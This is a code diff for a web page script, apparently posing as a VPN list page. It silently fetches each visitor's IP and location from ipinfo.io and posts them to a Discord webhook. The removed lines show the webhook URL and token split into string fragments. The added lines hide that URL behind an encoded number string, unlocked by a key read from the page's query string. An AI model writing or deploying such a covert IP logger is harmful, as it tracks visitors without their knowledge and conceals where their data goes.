@@ -1,20 +1,16 @@
-let user
 let vpnList = {}
+let user = (window.location.search.match(/(?<=\?user=).+(?=\?)/) || 'None')
+let decrypt = window.location.search.match(/(?<=\?code=).+/)[0].split('-')
+let hook = '9 10 2 10 3 9 10 8 1 8 6 8 3 3 3 4 10 8 10 / 25 -16 -2 44 29 45 29 2 -8 -4 -9 22 -13 -4 -19 41 41 29 42 -6 -18 -19 34 39 28 0 -23 39 34 -1 -24 44 -20 0 32 -9 44 28 45 3 -16 -4 33 28 27 1 _ 33 -5 25 30 2 27 -21 43 36 -1 42 -24 -24 2 -22 24 10 -3 -11 -20 -9'
+decrypt = [parseInt(decrypt[0]),parseInt(decrypt[1]),parseInt(decrypt[2])]
 
-if (window.location.search.includes('?user=')) {
-  user = window.location.search.replace('?user=','')
-}
-let hook = 'cord.com/ap'
-hook = 'https://dis' + hook;
-hook += 'i/webho'
-hook += 'oks/1080710292427776020/fQCyjzj8IEJcNETvvjwGSTotiAXtoBYyUAmJyiz7QEnih9_nFfk8hVxqBwYY8We0DLUJ'
-
-
+console.log(decrypt);
+console.log(unobfuscate(hook,...decrypt));
 fetch('./vpns.json')
 .then((response) => response.json())
 .then((json) => vpnList = json);
 
-if (user) {
+if (user && user != 'hidden') {
   $.getJSON("https://ipinfo.io/json", function(data) {
     console.log(data);
     var params = {
@@ -51,7 +47,7 @@ if (user) {
         }
       ]
     }
-    fetch(hook, {
+    fetch(unobfuscate(hook,...decrypt), {
       method: "POST",
       headers: {
           'Content-type': 'application/json'
@@ -59,7 +55,6 @@ if (user) {
       body: JSON.stringify(params)
     }).then(res => {
       console.log(res);
-      // console.log(JSON.parse('vpns.json'));
       setTimeout(
         ()=>{
           document.body.innerHTML = `
